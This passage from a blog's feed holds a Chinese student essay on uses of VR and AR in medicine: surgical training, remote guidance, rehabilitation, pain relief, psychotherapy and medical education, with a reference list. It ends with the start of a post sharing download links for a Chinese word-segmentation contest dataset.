    <content type="html"><![CDATA[<h1>VR/AR介绍</h1><p>虚拟现实技术（VR）是一种可以创建和体验虚拟世界的计算机仿真系统，它利用计算机生成一种模拟环境，是一种多源信息融合的、交互式的三维动态视景和实体行为的系统仿真使用户沉浸到该环境中。</p><p>VR是仿真技术的一个重要方向，是仿真技术与计算机图形学人机接口技术多媒体技术传感技术网络技术等多种技术的集合，是一门富有挑战性的交叉技术前沿学科和研究领域。VR主要包括模拟环境、感知、自然技能和传感设备等方面。模拟环境是由计算机生成的、实时动态的三维立体逼真图像。感知是指理想的VR应该具有一切人所具有的感知。除计算机图形技术所生成的视觉感知外，还有听觉、触觉、力觉、运动等感知，甚至还包括嗅觉和味觉等，也称为多感知。自然技能是指人的头部转动，眼睛、手势、或其他人体行为动作，由计算机来处理与参与者的动作相适应的数据，并对用户的输入作出实时响应，并分别反馈到用户的五官。传感设备是指三维交互设备。</p><p>而增强现实技术（AR）是一种实时地计算摄影机影像的位置及角度并加上相应图像、视频、3D模型的技术，这种技术的目标是在屏幕上把虚拟世界套在现实世界并进行互动。AR最早是于1990年提出的，之后随着电子产品运算能力的提升，其应用也是用途愈广。尤其是近两年来AR技术可谓是备受关注！现在的市场中由于可穿戴设备的出现，以及手机性能的进一步提升，AR技术也是持续升温。</p><p>AR是一种将真实世界信息和虚拟世界信息“无缝”集成的新技术，是把原本在现实世界的一定时间空间范围内很难体验到的实体信息（视觉信息,声音,味道,触觉等），通过电脑等科学技术，模拟仿真后再叠加，将虚拟的信息应用到真实世界，被人类感官所感知，从而达到超越现实的感官体验。真实的环境和虚拟的物体实时地叠加到了同一个画面或空间同时存在。不仅展现了真实世界的信息,而且将虚拟的信息同时显示出来，两种信息相互补充、叠加。在视觉化的AR实现中，用户利用头盔显示器，把真实世界与电脑图形多重合成在一起，便可以看到真实的世界围绕着它。</p><p>在接下来的叙述中，我将在第二部分分析VR/AR对于医生角度的应用，第三部分分析在病人角度的应用，第四部分是在医疗教育方面的应用，其他相关的研究我将在第五部分陈述，现阶段研究的不足将在第六部分分析，最后两部分是一点我的个人感想和本文结论。</p><h1>对于医生的应用</h1><h2 id="模拟手术">模拟手术</h2><p>虚拟手术作为一个虚拟现实领域的重要研究方向，正成为科学家们的关注焦点。它是集现代医学、计算机图形学、计算机视觉、生物力学、材料学、机器人等诸多学科为一体的新型交叉研究领域。医生可以通过虚拟现实技术来模拟、指导医学手术所涉及的各种过程，包括手术计划制定、手术排练演习、手术教学、手术技能训练、术中引导手术、术后康复等。</p><p>80%的手术失误是人为因素引起的，因此手术训练极其重要。以前医生手术训练都只能在病人身上做，所以经常说有名的医生都是踏过多少人的血液才走过来的，这样付出的代价实在太大。在VR/AR技术飞速发展并广泛应用的今天，模拟手术在医生训练过程中非常重要的应用就是，医生可以在不接触实际病人的前提下模拟各种手术场景，模拟的场景可能比真实遇到的情况还要多，这样模拟训练的效果实际上就超过了真实的练刀。一方面，模拟训练可以在任何地方、任何时间反复模拟，深化印象，这个优点在实际病人身上是不可能也不允许做的，因为病人的资源是有限的。模拟手术就是把每个可能的手术场景都呈现在你的面前，每个人得到的机会都是无穷次的，医生可以反复看、反复练，并且对病人没有伤害。如果从这点来讲，一个经过模拟训练的医生再给病人做手术时，他的学习周期就会很短很短，这个实际上是对病人利益的极大保护。当前模拟手术在中国也已经有了，像强生公司、科汇公司的外科培训中心已经有腹腔镜的模拟，也有介入手术的模拟，当然还有达芬奇手术的模拟，但这种模拟还不是真实场景的，也就是说未来在VR技术里面，可以完全进入到手术室，然后在真实的场景里面进行模拟手术，那就更加接近于现实。</p><p>大家应该知道在体育运动里，比如足球、体操，都有慢动作回放，有动作捕捉去分析运动员动作是否做到位了，失误的原因是什么。这个技术同样可以用到外科手术里。通过运动捕捉或者手势识别和VR技术，在外科大夫进行学习或尝试以后，可以复原手术，看到手术的过程，如果有失误，原因是什么。这种回放能极大的帮助医生改进他们的技术。</p><h2 id="远程干预-指导">远程干预/指导</h2><p>世界上首例实验性远程手术已经在1999年成功地进行。虚拟手术与远程干预将能够使在手术室中的外科医生能实时地获得远程专家的交互式会诊。交互工具可以使顾问医生把靶点投影于患者身上来帮助指导主刀外科医生的操作，甚或通过遥控帮助操纵仪器。这能使专家们技能的发挥不受空间距离的限制。如果VR技术在这一方面继续发展的话，可能会出现以后医生不用到医院上班，无论在任何地方都可以实施手术。缓解了当今医院基础设施不足的现状。同时，有些相同的手术，某专家可以通过VR技术远程指导，这样就打破了一个时间段只能进行一项手术的限制，大大提高医疗的效率。</p><h2 id="精确操作">精确操作</h2><p>如上文已经提到的达芬奇机器人，还有很多像这种医生能够远程控制其操作的手术设备，通过使用这些设备，能够在实际的手术中，避免因为医生长时间工作造成的身体情况变化而带来的手术质量参差不起的问题（例如某医生一天手术过多，太过劳累，这样后来的手术必然会质量下降）。如果使用了VR技术，远程控制诸如达芬奇机器人一样的手术设备，不管医生自己身体状况如何，只要控制到位，那些手术设备是不会因为工作时间长就产生不适的，这样也能保证手术质量优秀。同时，一个医生只有两只手，所以有些手术需要助手，而使用那些设备之后，一个医生可以控制很多只手，这样就能够协调统一，对手术质量有百利而无一害。</p><h2 id="协助执行日常任务">协助执行日常任务</h2><p>医生需要经常查看病人的病情，而在现在的医疗设施情况下，对于一个医生，可能得通过“查房”一间一间地去病房里与病人交流，而且交流记录难免会记忆不清或者甚至搞混了。有了VR技术虚拟医生协助真实医生实现这些复杂的工作，效率必然会大大提高。医生甚至都不用出办公室，只需要观察相应的VR反馈就可以基本实现之前的“查房”任务。这样一来就可以大大减轻医生的负担，必然会对医生的日常工作效率产生积极的影响。这些虚拟医生与病人交流的数据可以保存用来对之后的反馈对比，当然可以用其他机器学习的方法来进行一些预测之类的计算。并且基于大数据，可能这些虚拟医生对单个病人情况的分析会比真实的医生更专业，因为医生也不是能对每个症状都了如指掌的。</p><p>有些病人（例如老人和小孩等）可能在认识自己病情上有欠缺，例如忘记吃药，每次吃多少药等，在传统的方案中，要么有专人提醒，要么在显眼的地方做上标记提醒，总之效率不高或者费时费人力。当我们在某种小的设备上加上VR/AR提醒，以一个三维立体的形象的形式来提醒病人，既省时又省人力，效率相对还比较高。</p><h2 id="获得医药信息">获得医药信息</h2><p>医生可能不能记住每种药物的作用，以及每种药物的使用方式，假如能通过VR技术将每种药的使用信息都记录下来，通过相关的设备，让医生在给病人开药的时候头脑里能对这种药的所有情况都回顾一遍，同时还可以与几种相似的药做对比，找出最好的组合，避免偶尔的误用药。</p><h2 id="获取用户机体信息">获取用户机体信息</h2><p>在现在正常的医学治疗步骤中，医生想要检查病人某部位的病变情况，只能使用诸如CT、CTA等基于切片的二维人体部位图像，这种图像相对来讲专业要求度较高，对人体伤害较大，同时准确性也不能得到保障。将VR应用于此种工作，我们可以得到人体某部位的三维立体真实大小的模型，这样一来医生的判断会更加准确而且这种图识别起来相对不需要那么复杂的专业知识。</p><h2 id="血管照明-辅助手术">血管照明（辅助手术）</h2><p>这算是一种比较专业地说法，和辅助手术概念比较类似，简而言之就是通过PC应用软件帮助医务人员在手术中能够查看隐藏的血管。此前，心脏病专家借助谷歌眼镜疏通了一位49岁男患者阻塞的右冠状动脉。冠状动脉成像（CTA）和三维数据呈现在智能眼镜的显示器上，根据这些实时放大图像，医生可以方便地将血液导流到动脉。不同于传统手术，AR的介入就像一个”AR放大镜”，直接放大手术创口，患者的彩超、MRI、CT图像等将直接映在手术部位，让医生能够看到肉眼难以分辨的细微情况，获得“透视”功能，大大提高手术操作的效率和舒适度。</p><h2 id="损伤评估">损伤评估</h2><p>在传统的医疗实践中，如果病人就诊，医生为了确定病人病情只能通过明显的外表特征或者患者的口头表述来确定，而这样的手法往往会带来误判或者病情程度判断不清等问题，特别是那种很难表述清楚的内科疾病。运用虚拟现实技术，我们可以针对不同的疾病设定不同的诊断场景，让用户在特定场景中将应该表现出来的病症全部表现出来，这样一来有利于增大诊断的准确性。</p><h1>对于病人的应用</h1><h2 id="智能康复系统">智能康复系统</h2><p>基于Kinnect等运动捕捉设备所设计出的很多结合VR/AR技术的智能康复系统，这些系统能够很好的帮助病人进行相应的康复训练。在之前我所看到的一个例子中， 病人只需要带上相应的可穿戴传感器就可以将自己的动作传到相应的计算机进而在计算机显示屏上显示用户的动作以及在显示屏中出现的影像之间的交互。在我所看到的实例中，他们只是能做到在场景中增加一些物体（例如长方体等），让病人在虚拟的环境中模拟各种体力锻炼。这样一来，我们就不需要实际花费很多的金钱来布置训练场景，而且VR所形成的场景还可以很轻易得更换，不用为维护实际的场景而花费很多精力。</p><p>调查显示，以色列的研究人员开发出一套“电脑辅助康复环境系统”，通过模拟划船、打球、慢跑等各种情景，来帮助残障人士改善平衡能力，恢复身体的运动机能。足部神经受损的博罗夫斯基就在接受“电脑辅助康复环境系统”的治疗。现在系统模拟的是“海上冲浪”，大屏幕上显示的是冲浪的场景，博罗夫斯基脚下的踏板会根据设置好的程序相应的摇动，他必须通过调节身体的姿势来保持平衡。同时，连接在他身上的传感器还能把各种身体体征数据传回电脑，以便医生调整训练强度和难度。丰富的影像和新颖的训练方式，让患者像在做游戏一样，更能提高患者本身的主动性和积极性，加强训练效果，缩短住院时间，加快康复过程。无论从时间、人力还是金钱上讲，VR/AR技术的使用必然会在康复系统上带来一场新的革命。</p><h2 id="帮助治疗某些疾病">帮助治疗某些疾病</h2><p>有些疾病（例如某种危险情况恐惧症），需要病人在再临其境时才可能克服，但如果让患者在现实中的危险环境再次体验，可能会有安全性问题，而且相同的场景很难真实地完美还原。如果使用VR技术，就可以在基本不耗费后期资源的情况下反复体验相同的场景，在现实中，用户也不会有任何的伤害，而且可调节范围比较广，毕竟是电脑虚拟程序，恐怖程度、危险指数等都可以随心所欲地变化，与现实相比真的是有巨大的优势。</p><p>截肢者中最常见的烦恼就是幻肢痛——患者感到被切断的肢体仍在，且在该处发生疼痛。疼痛多在断肢的远端出现，疼痛性质有多种，如电击、切割、撕裂或烧伤等。对幻肢痛的发生原理，目前尚无统一意见，西医亦乏有效疗法。很有可能大脑对肢体仍然存有意识，即使它已经不存在了。尽管这样的问题发生存在一定的频率，但至今没有一种有效地方法适用于所有的截肢者。在使用VR技术治疗过程中研究人员使用头戴式耳机和一个传感器将患者带入虚拟的世界，患者可以感受到自己的肢体还在，并可以控制虚拟肢体从事某项工作或游戏。这样就能很好的解决这一疾病，有研究表明对这种疾病VR治疗作用十分显著。</p><p>VR对创伤后应激障碍也同样有很好的治疗作用。在对从伊拉克和阿富汗返回患有创伤后应激障碍的士兵所进行的VR治疗过程中，VR设备会将会把士兵带回中东的一个小镇，让他们再次“经历”战争和死亡，使其在适当的压力下逐渐学会处理，控制自己的情绪。虽然很多人对于这种治疗方式存在争议，支持者说使用虚拟现实技术与其他的治疗方式相结合会达到非常很理想的治疗效果。</p><p>VR可以帮助治疗的心理障碍并不仅仅局限于创伤后应激障碍。还有些心理问题（例如自闭症、害羞等），是一个杀人于无形的凶手，目前呈现向低龄化蔓延的趋势。虚拟现实可能也会成为这个问题的解决方案之一。如果有人能既为患者保守秘密有能很好的与用户交流，对治疗这些疾病肯定是有很大的好处的，但是现实中不可能存在这样的一个完美的“倾听者”，即使有，价钱也是不菲的。如果VR/AR能够起到这样的作用那必然会是又一大医学进展。</p><p>很多心理治疗师和精神专家常用的方式是通过在治疗过程中去引导患者回忆或者想象场景，以此来达到治疗的目的。VR的好处在于它能够让这种环境场景变得可视化和标准化。因此在心理治疗领域，比如说创伤应急、障碍症、恐惧症、自闭症、恐高症、幽闭症、公开演讲恐惧症、密集恐惧症等都可以通过VR技术的环境再现以达到治疗的目的。再比如说，焦虑症、注意力缺陷以及精神分裂症也可以通过VR来虚拟特定的人或是特效来改善相关的一些症状。</p><h2 id="虚拟问诊">虚拟问诊</h2><p>在国内外，好的医生都是十分欠缺的，然而相同的疾病缺屡见不鲜，可以说很多小病完全可以在还是在早期的时候就通过及时就诊可以避免出现的，在之前的这么多年，很多搜索引擎也都在做相关的疾病问答系统，可悲的是大多受金钱诱惑，为金钱奴役，不干正事反而虚假宣传。VR技术的出现，必然在医疗问答方面带来很大的革新，患者可以通过VR设备与虚拟的医生直接进行交谈，不仅避免了文字表述不清的问题，而且也避免受网页上那么多的虚假广告的诱惑，更是给人一种如见真实医生的舒适的感觉，而且VR医生会比现实中医生更有耐心，更专职为你一人服务。</p><h2 id="缓解疼痛">缓解疼痛</h2><p>读到这样一个故事，“2017年年初，美国的一位脂肪瘤患者开刀时，因为平时血压过高，医生只为她注射了少量镇静剂。医生为她戴上了VR设备，在手术过程中患者一直在玩一个埃及探险的游戏。手术过程中，监测仪器显示患者的一切生命体征参数，都非常平稳。在整个手术过程中，患者的血压不仅没有提升，反而下降了。手术完成后，患者表示她几乎没有感到疼痛。”我觉得有了这个实例，我不需要过多的解释，已经能够很好的说明VR在缓解病人疼痛上的作用了吧。无独有偶，接受重度烧伤治疗是一段痛苦的经历。伤口清理和绷带变化都会引发疼痛，即便使用吗啡等麻醉药物，仍有86%的病人会感到或多或少的疼痛，并且大量使用还会对身体造成一定伤害。1996年，华盛顿大学人机界面技术实验室（HITLab）研究人员发现孩子们在玩游戏时是越来越全神贯注后，想出了为治疗烧伤提供VR游戏，假设沉浸在游戏中会为病人带来积极疗效，他们会更专注于游戏，而减轻对疼痛的注意力。据调查，社会行为医学2011年发布的调查展示了浸入式游戏作为止痛剂的强大作用。并且现在这项技术已经被美国军方使用，帮助受伤的士兵接受治疗。</p><p>当然在平时的生活中，VR也是能够起到很好的。当我们沉浸在一个虚拟的美好的游戏环境中时，我们可以忘记暂时的伤痛，这是一个常识，也是VR能在这一方面得到巨大应用的一个原因。</p><h2 id="戒瘾">戒瘾</h2><p>当今社会的另一大“疾病”，不是身体上的，更大多数是心理上的，例如网瘾、烟瘾甚至毒瘾。在以前的戒瘾所，采取的唯一方式就是物理上的隔离，在VR技术快速发展的今天，我们完全可以通过VR将患者的精力集中到正确的角度上，不仅可以将效果提高，而且省时省力。查阅资料发现，我国相关法律已经开始涉足使用VR进行戒毒活动了。</p><p>当然，其实在这里VR可能成为一把双刃剑，可能能将用户的注意力从其他那些及其不正常的生活习惯中解救出来，但是可能又会让用户陷入“VR瘾”中，现在我们还无法证明这个“VR瘾”和其他的“网瘾”、“烟瘾”等孰轻孰重，所以此法需要慎重使用。</p><h2 id="vr-ar与视觉结合">VR/AR与视觉结合</h2><p>VR本身就是可以直接作用于人的视觉，视觉治疗方案与VR技术很容易匹配。现在升学、工作压力，导致大部分人都有眼部疾病或视觉障碍。VR在治疗眼部的疾病，比如儿童的斜视、近视以及立体视力的缺陷上有很好的效果。虽然在不久之前就有对近视等疾病的物理治疗方案，但是大多费时费力，而且没有听说有什么可观的进展。但是VR/AR的到来就完全不同了，大大提高了效率而且效果明显提高。同时可以制作一种VR设备用来缓解疲劳的眼球，当我们工作或者学习很长时间之后，可以用它来对眼球“做做操”。虽然我们都明白久看之后需要远眺一会，或者看看绿色的动西，但是迫于现实，我们可能很难做到（例如哈尔滨的冬天没有绿树。），但是这一切都可以用VR设备来实现。</p><h2 id="缓解术前压力">缓解术前压力</h2><p>接受手术的患者到了陌生环境，难免会有应激反应。他们可能觉得在手术室外等候，麻药还没有生效的时候，他们有强烈的紧张感和恐惧感，甚至有了濒临死亡的体验。现在想一想，这种体验对每个人来说都是非常不好的。虽然术前医生和患者有充足时间做沟通，但是单纯靠用嘴讲、用图、甚至手画示意图，都是一件非常累的事情，因为手术的复杂性和专业性，包括一些专有名词，对患者来说真的是选择性记忆，他们有可能听了上半句，就忘了下半句，甚至把最主要的东西漏掉，支离破碎地理会医生的意思，即使再出色的现场描述也比不过真实环境的真实还原。如果运用VR技术，在手术开始前给患者放一段容易让他放松的内容，让他在进手术室之前，大致了解手术室和手术过程是什么样子的，就能消除他对未知环境的恐惧。我相信这对患者来说是人文的关怀，这在提高医学服务水平里面可以得到有效的应用。</p><h2 id="隐私保护">隐私保护</h2><p>现在我国的搜索引擎在医疗上很不受人看好的一个主要原因就是其泄露用户隐私的现象太严重，所以很少有人真正愿意相信搜出来的东西。加入VR/AR元素进入我们的生活，我们可以与虚拟形象进行完全不用担心泄露隐私的情况下的交流。</p><h1>医疗教育的应用</h1><h2 id="手术教学">手术教学</h2><p>伴随互联网的继续发展，如果医学手术教育能够通过VR/AR技术实现，至少在解剖学课程上可以实现意想不到的效果。在相关的设计中，例如心脏的VR模型可以做的特别逼真，让学生可以把心脏托在手里面，随时都可以转圈、打开肌肉看，血流都可以看，这就可以大大缩短医学生的学习周期（而且可以打破时间、地点的限制来学习）。尤其对于外科医生来讲，外科医生很重要的工作就是解剖。局部解剖以前医学生只能通过书本来学习，看到的都是平面的东西，脑子里很少有立体的概念，无法产生互动，进而需要很长的时间来消化知识，甚至很多时候大多数医学生并不能形成很好的立体的模型在脑子中，所以这就是很多庸医出现的根源。VR/AR技术的出现使得医学生在真正操刀做手术之前，就能获得局部解剖的经验，能够有效提高手术的安全性和成功率。而如果医学生通过VR/AR技术实现解剖模拟，学习速度会大大加快，同时降低学习的成本。当然AR在医学教育的应用并不仅仅是在解剖学上面，在生理生化方面都是可以通过VR技术模拟场景的。如果我们可以获得很形象的信息的话，对医生的知识拓展和学习速度都会急剧加快。</p><p>据早在1993年的统计里，全球市场上出现的805个虚拟现实应用系统中就有49个应用于医学，主要应用在虚拟人体、医学图像学、药物分子研究等方面。大家都知道，在传统的医学教育中，如人体标本解剖和各种手术实训，大都受到标本、场地等限制，实训费用高昂。而且医学生不能通过反复在病人身上进行操作来提高临床实践能力、临床实践具有较大风险。而VR的直观和体验特性却可以很好地解决以上问题。目前在医学教育上应用较多的有虚拟人体解剖学、手术训练教学、虚拟实验室、虚拟医院等。类别也从内容、软件到硬件，甚至还有从事交叉研发的，比如，Oculus涉足了内容、硬件和软件等方面，微软HoloLens则是软硬件结合等。</p><p>利用VR技术来做外科手术培训另一个重要的特点是，大大节约了成本。在外科领域，医疗知识每隔6~8年就要翻一番，所以外科大夫在专业教育上尤其是在继续教育上需要不断追求对新技术的学习，这种新技术的学习成本是高昂的，方法是复杂的。而VR技术可以在某种程度上帮助大家学习或者熟悉这种新技术。</p><h2 id="教学用具改革">教学用具改革</h2><p>传统解剖学挂图和大部分多媒体课件上应用的教学图片都是二维模式，缺少直观的、立体的体验，造成了解剖学习的困难。模型、标本虽具有立体结构，但形式单一、僵硬，不能满足多角度、多层次的教学和实训需求。而虚拟人体解剖图，可在显示人体组织器官解剖结构的同时，显示其断面解剖结构，并可以任意旋转，提供器官或结构在人体空间中的准确定位、三维测量数据和立体图像。此前，美国加州健康科学西部大学（波莫纳）开设了一个虚拟现实学习中心，该中心拥有四种VR技术、zSpace显示屏、Anatomage虚拟解剖台、Oculus Rift和iPad上的斯坦福大学解剖模型，旨在帮助学生利用VR学习牙科、骨科、兽医、物理治疗和护理等知识。</p><h1>相关研究进展</h1><p>尽管业内不少人将2016/2017年称之为“VR发展元年”，若追溯VR发展的历史，早在1932年，Aldous Huxley在其推出的科幻小说《美丽新世界》中即对虚拟现实概念进行了描述。而直到1968年计算机科学家Ivan Sutherland开发了“达摩克利斯之剑”，使得VR设备具备了基本的雏形。随后，VR设备开始应用在一些专精领域，如宇航员的训练活动中。直到1987年，任天堂推出了Famicom3D System眼镜之后，Virtual Boy等设备将VR概念正式带入民用领域。而随着近些年来，视频技术以及移动硬件领域的不断发展，民用VR平台也根据使用者的不同呈现出了分化的状态，包括以游戏平台作为计算平台的专属VR平台、以PC作为计算平台的综合体感VR平台、以及以移动设备作为计算与显示窗口的VR眼镜。</p><p>硬件厂商方面，在对各类VR设备的研发加大投入力度，VR头盔，眼镜，以及附属的传感器设备在过去的一年中纷纷涌现。</p><p>视频平台方面，除了传统视频上传方式外，各大视频平台均开放了“全景视频”的上传接口，用于鼓励视频制作团队为平台增加全景类视频的内容量。但由于目前全景视频的制作与存储成本非常高，能够完成全景视频录制与制作的团队并不多，所以目前多数存留在VR平台端的视频实际为3D的“沉浸式”的视频内容。除此之外，部分平台采取聚合方式，将目前市面上鲜见的VR视频内容加以收集整理，集中呈现在用户面前。而技术方案提供方虽然距离用户较远，却是目前推进整个VR行业发展的最为重要的一方，技术方案将成型的算法，图像引擎等输出给视频平台或硬件厂商，以增强用户在两方的使用体感。</p><h1>存在的问题</h1><p>VR在医疗应用方面，相比用作练习、模拟来讲还是很欠缺的。AR in China 最近期的统计，如今国内从事AR应用开发的企业有200多家，其中80%倾向和已开发游戏类应用，剩余的也多偏向影视、购物等生活类应用。而专注在医健领域的应用，根据公开信息推测目前不超过10家。而在海外，据 CBInsights、CrunchBase、AngelList 网站的综合数据查询，目前有30家左右初创公司正专注在AR医疗应用领域。其中9家初创公司获得融资，总融资额达5.52亿美元，获投率达到了30%。AR在医健领域的应用还处于蓝海探索期。</p><p>纯粹的VR在医疗领域还是有很大欠缺的。在现在的VR辅助手术中，医生只能利用AR技术的一些优势，并不能完全交给VR来做，还需要加上传统方法，一边做手术一边对着电脑屏幕比对着看。</p><p>VR用于治疗方式的缺点是患者的想象和回忆难于把控，所以效果很难评估。</p><p>而且现在的VR在显示和精确度方面还是有很大的提升空间的。特别实在医疗领域，准确度至关重要。</p><p>对于医生而言，还有适应问题，这些新技术对于有经验的外科医生及其他专业医护人员来讲，“适应”是最大的挑战。</p><p>虽然VR技术在医学上应用后能够减少现实中的直接的隐私泄露，但是如果VR数据泄露将导致比现在信息泄露更严重的后果，毕竟VR可以记录整个人的信息而不仅仅是文字信息。</p><p>VR的一个很大的问题就是基础硬件设备的体验问题。如果要让医生或者被治疗者长时间呆在虚拟环境中，很容易产生一些生理不适的症状。</p><p>虽然说VR在医学上的应用很丰富，尤其是在心理治疗方面颇有成效。但是考虑到治疗的针对性和VR内容制作难度等各种问题，这种辅助治疗方法在现阶段很难进行大规模的应用。</p><p>医疗行业需要的是严谨的专业知识和态度，所以对于内容的要求也就相应的提高。如果要开发出一套模拟的人体用来交互培训，需要的是具备医学加上合理内容开发的复合型人才。而且考虑到医学诊断的高精度要求，许多器官或者组织的建模都要非常精细，不能有一丝的马虎，而现在的VR医疗应用更多的还是停留在头戴式VR视频方面。</p><p>其他要面临的困难还有：治疗和评估标准没有相关的评估标准、应用系统的交互性和易用性还不够完美。虚拟现实系统设备及其外设性价比例失衡，设备相对比较昂贵,致使大规模应用的时机还不够成熟。</p><h1>个人感想</h1><p>虽然最近VR/AR技术越来越火，相关研究也相当多，涉及的行业也是相当全面，但是在现在的情况下，绝大多数成就集中在仿真、游戏上，在医疗领域还是存在很多问题，还有很长的路要走。但希望不要又只能火两年而已。</p><p>在医疗工作的各个领域推广VR技术的应用，可以节省大量的时间与资源，从而更快捷、更安全的挽救生命。国际上由于虚拟现实技术的发展而发展起来的医疗电子设备正以每年10%的速度增长。随着计算机、多媒体技术、传感技术、通讯技术的发展以及各国对虚拟现实技术的日益重视，相信这一技术在医学上的应用在将来会取得更大的发展，它的发展前景非常诱人。可以预言，虚拟现实技术在医学中更广泛、更深入的应用将会给传统医疗带来革命性的变化。</p><p>在我们国家，新一轮的医疗体制改革如火如荼，传统的医疗体系已经岌岌可危，惟有引入新的信息技术才能适应时代要求。而且，新的医疗体制改革凸现了“社区医疗”的概念。“社区医疗”在全球医疗信息化中对应其第三个阶段，区域医疗信息网络（GMIS），是继医院管理系统（HMIS）、临床医疗信息系统（CIS）之后的阶段。美国所有医疗机构均实现了信息化管理，而中国尚处在初级阶段。将来中国的趋势必然是走向医疗信息化（e-Health）。为了实现这一战略目标，虚拟现实技术就是最佳的操作工具。因此，虚拟现实技术将在中国的“医改”过程中以及今后医疗事业的发展中扮演更加积极、重要的角色。</p><p>医疗VR是一个给人无限遐想的领域，它不再只存在于科幻小说爱好者的想象中，而是已经走进了临床研究者和现实生活中的医疗工作者的视野。虽然这是一个全新的领域，还不为大众所知，但是医疗VR技术是对患者的生活和医生的工作都可以产生积极影响的应用。我相信VR必将为医学领域带来一场大变革。</p><h1>结论</h1><p>VR/AR作为目前比较新潮的技术，在医学领域作用空前。其在医疗上无论从医生角度、患者角度还是医学教育角度都有着十分巨大的作用。现在相关的科学研究也发展迅速，当然也是存在很多的不足，尤其是我们国家在这方面的研究还很欠缺。在今后的一段时间内，我国的VR开发者还是应该多学习和借鉴国外的先进经验，同时保持在这方面的热情，相信在不久的将来，VR/AR定会在医学领域大大地大放异彩。</p><h1>参考文献</h1><ol>  <li>刘建武, 叶志前, 陆金芳. 虚拟现实在医学中的应用进展[J]. 国际生物医学工程杂志, 2000(6):321-324.</li>  <li>王海舜, 潘利庆. 虚拟现实技术在医学中的应用[J]. 计算机应用, 1998, 22(6):49-54.</li>  <li>刘聚卑, 庄天戈. 虚拟现实在医学上的应用[J]. 北京生物医学工程, 2000, 19(1):47-54.</li>  <li>谭珂, 郭光友, 王勇军,等. 虚拟现实技术在医学手术仿真训练中的应用[J]. 解放军医学院学报, 2002, 23(1):77-79.</li>  <li>范立冬, 李曙光, 张治刚. 虚拟现实技术在医学训练中的应用[J]. 创伤外科杂志, 2008, 10(6):568-570.</li>  <li>谭海珠, 杨棉华, 陈丹芸,等. 虚拟现实技术在医学中的发展与应用[J]. 中华医学教育探索杂志, 2005, 4(6):410-412.</li>  <li>张晗 虚拟现实技术在医学教育中的应用探讨[J]. 西北医学教育, 2010, 18(1):48-51.</li>  <li>孙秀伟, 阎丽, 李彦锋. 虚拟现实技术(VR)在医疗中的应用展望[J]. 临床医学工程, 2007(5):17-20.</li>  <li>吴奇, 程薇曦. 虚拟现实技术在医学手术中的实现与应用[J]. 重庆医学, 2008, 37(21):2489-2491.</li>  <li>李舫, 宋志坚. HMD式光学穿透技术在医学增强现实中的研究进展[J]. 中国数字医学, 2012, 07(1):14-20.</li>  <li>孙国臣, 余新光, 陈晓雷,等. 基于多模态功能神经导航的虚拟现实及增强现实技术在神经外科教学中的应用[J]. 中国医学教育技术, 2015(1):66-69.</li>  <li>李潜. 增强现实技术为医学教育开拓无限未来[J]. 电脑知识与技术, 2012, 08(2):481-482.</li>  <li>张军毅. 医学增强现实建模及可视化研究[D]. 首都医科大学, 2008.</li>  <li>赵娜, 杨谊平. 增强现实技术与手术模拟[J]. 中华医学丛刊, 2004(4):58-59.</li>  <li>Wang S, Parsons M, Stonemclean J, et al. Augmented Reality as a Telemedicine Platform for Remote Procedural Training.[J]. Sensors, 2017, 17(10):2294.</li>  <li>Noll C, Jan U V, Raap U, et al. Mobile Augmented Reality as a Feature for Self-Oriented, Blended Learning in Medicine: Randomized Controlled Trial[J]. Jmir Mhealth &amp; Uhealth, 2017, 5(9):e139.</li>  <li>Mero M, Susin A, Aplicada D M. Deformable 3D Objects for a VR medical application[J]. 2007.</li>  <li>Crossan A, Brewster S, Reid S, et al. Multi-session VR Medical Training: The HOPS Simulator[J]. People and Computers XVI - Memorable Yet Invisible, 2002:213–226.</li>  <li>Bezerra A. Evaluation of VR medical training applications under the focus of professionals of the health area[C]// ACM Symposium on Applied Computing. ACM, 2009:821-825.</li>  <li>JLM Vazquez, BK Wiederhold, I Miller, et al. Virtual Reality Assisted Anesthesia (VRAA) during Upper Gastrointestinal Endoscopy: Report of 115 Cases— Analysis of Physiological Responses, 2017</li></ol><p><br><br>本文链接： <a href="http://home.meng.uno/articles/c1dd0093/">http://home.meng.uno/articles/c1dd0093/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      VR/AR介绍
虚拟现实技术（VR）是一种可以创建和体验虚拟世界的计算机仿真系统，它利用计算机生成一种模拟环境，是一种多源信息融合的、交互式的三维动态视景和实体行为的系统仿真使用户沉浸到该环境中。

VR是仿真技术的一个重要方向，是仿真技术与计算机图形学人机接口技术多媒体技术传感技术网络技术等多种技术的集合，是一门富有挑战性的交叉技术前沿学科和研究领域。VR主要包括模拟环境、感知、自然技能和传感设备等方面。模拟环境是由计算机生成的、实时动态的三维立体逼真图像。感知是指理想的VR应该具有一切人所具有的感知。除计算机图形技术所生成的视觉感知外，还有听觉、触觉、力觉、运动等感知，甚至还包括嗅觉和味觉
    
    </summary>
    
      <category term="Computer Graphic" scheme="http://home.meng.uno/categories/Computer-Graphic/"/>
    
    
      <category term="VR" scheme="http://home.meng.uno/tags/VR/"/>
    
      <category term="AR" scheme="http://home.meng.uno/tags/AR/"/>
    
      <category term="医疗" scheme="http://home.meng.uno/tags/%E5%8C%BB%E7%96%97/"/>
    
  </entry>
  
  <entry>
    <title>中文分词小赛数据</title>
    <link href="http://home.meng.uno/articles/649482ba/"/>
    <id>http://home.meng.uno/articles/649482ba/</id>
    <published>2017-10-30T08:02:41.000Z</published>
    <updated>2020-12-02T01:56:17.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>纪念一下大四组织的一次中文分词小比赛。</p></blockquote><h2 id="分项数据">分项数据</h2><ul>  <li>训练数据： 链接: <a href="https://pan.baidu.com/s/1sl9JLqX" target="_blank" rel="noopener">https://pan.baidu.com/s/1sl9JLqX</a> 密码: 8am6</li>  <li>测试数据： 链接: <a href="https://pan.baidu.com/s/1eSeYhfO" target="_blank" rel="noopener">https://pan.baidu.com/s/1eSeYhfO</a> 密码: cnw2</li>  <li>相关参考答案： 链接: <a href="https://pan.baidu.com/s/1c2tVto0" target="_blank" rel="noopener">https://pan.baidu.com/s/1c2tVto0</a> 密码: 3rpt</li>  <li>有切分歧义的100个句子：链接: <a href="https://pan.baidu.com/s/1gfJ7Duz" target="_blank" rel="noopener">https://pan.baidu.com/s/1gfJ7Duz</a> 密码: 8mmx</li></ul><h2 id="所有数据">所有数据</h2><p>所有文件下载：链接: <a href="https://pan.baidu.com/s/1smU54gl" target="_blank" rel="noopener">https://pan.baidu.com/s/1smU54gl</a> 密码: x5ne</p><h2 id="测试结果">测试结果</h2><p>相关PPT：<a 